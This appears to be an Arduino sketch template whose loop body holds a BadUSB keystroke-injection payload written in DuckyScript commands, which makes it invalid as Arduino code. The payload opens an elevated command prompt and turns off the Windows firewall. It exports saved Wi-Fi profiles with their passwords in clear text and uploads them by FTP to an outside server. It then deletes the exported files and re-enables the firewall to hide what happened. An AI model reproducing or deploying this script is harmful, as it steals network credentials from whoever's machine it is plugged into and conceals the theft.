void setup() {
  // put your setup code here, to run once:

}

void loop() {
  // put your main code here, to run repeatedly:
ESCAPE
DELAY 2000
CONTROL ESCAPE
DELAY 400
STRING cmd
DELAY 400
CTRL-SHIFT ENTER
DELAY 400
STRING netsh firewall set opmode mode=disable
ENTER
DELAY 400
STRING netsh wlan export profile key=clear
ENTER
DELAY 400
STRING cd %USERPROFILE%
ENTER
DELAY 400
STRING ftp -i ftp server
ENTER
DELAY 400
STRING username
ENTER
DELAY 400
STRING password
ENTER
DELAY 600
STRING prompt
ENTER
DELAY 400
STRING prompt
ENTER
DELAY 400
STRING MPUT *.xml
ENTER
DELAY 4000
STRING bye
ENTER
DELAY 400
STRING del *.xml
ENTER
DELAY 200
STRING netsh firewall set opmode mode=enable
ENTER
DELAY 400
ALT SPACE
STRING c
}
